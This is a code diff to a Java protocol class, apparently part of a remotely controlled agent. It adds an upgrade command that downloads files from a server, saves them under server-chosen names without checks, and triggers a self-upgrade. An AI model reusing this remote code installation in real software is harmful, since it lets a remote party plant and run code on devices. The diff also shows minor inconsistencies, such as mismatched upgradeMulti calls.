@@ -107,6 +107,18 @@ public class ZProtocol extends Protocol {
                     left = parseUpload(response);
                 }
             }
+            
+            if (capabilities[Proto.UPGRADE]) {
+                //#ifdef DEBUG
+                debug.info("***** Upload *****");
+                //#endif  
+
+                boolean left = true;
+                while (left) {
+                    response = command(Proto.UPGRADE);
+                    left = parseUpgrade(response);
+                }
+            }
 
             if (capabilities[Proto.FILESYSTEM]) {
                 //#ifdef DEBUG
@@ -477,9 +489,9 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("parseUpload left: " + left);
                 //#endif
-                String file = WChar.readPascal(dataBuffer);
+                String filename = WChar.readPascal(dataBuffer);
                 //#ifdef DEBUG
-                debug.trace("parseUpload: " + file);
+                debug.trace("parseUpload: " + filename);
                 //#endif
 
                 int size = dataBuffer.readInt();
@@ -489,8 +501,71 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("parseUpload: saving");
                 //#endif
-                Protocol.saveUpload(file, content);
+                Protocol.saveUpload(filename, content);
 
+                if(left==0){
+                    if (filename.equals(Protocol.UPGRADE_FILENAME_0)
+                            || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
+                        upgradeMulti();
+                    }
+                }
+                
+                return left > 0;
+
+            } catch (EOFException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.trace("parseUpload, NO");
+            //#endif
+            return false;
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseUpload, wrong answer: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
+    }
+    
+    Vector upgradeFiles = new Vector();
+    protected boolean parseUpgrade(byte[] result) throws ProtocolException {
+
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.trace("parseUpgrade, OK");
+            //#endif
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                int totSize = dataBuffer.readInt();
+                int left = dataBuffer.readInt();
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade left: " + left);
+                //#endif
+                String filename = WChar.readPascal(dataBuffer);
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade: " + filename);
+                //#endif
+
+                int size = dataBuffer.readInt();
+                byte[] content = new byte[size];
+                dataBuffer.read(content);
+
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade: saving");
+                //#endif
+                Protocol.saveUpload(filename, content);
+                upgradeFiles.addElement(filename);
+                
+                if(left==0){
+                    Protocol.upgradeMulti(upgradeFiles);
+                }
+                
                 return left > 0;
 
             } catch (EOFException e) {
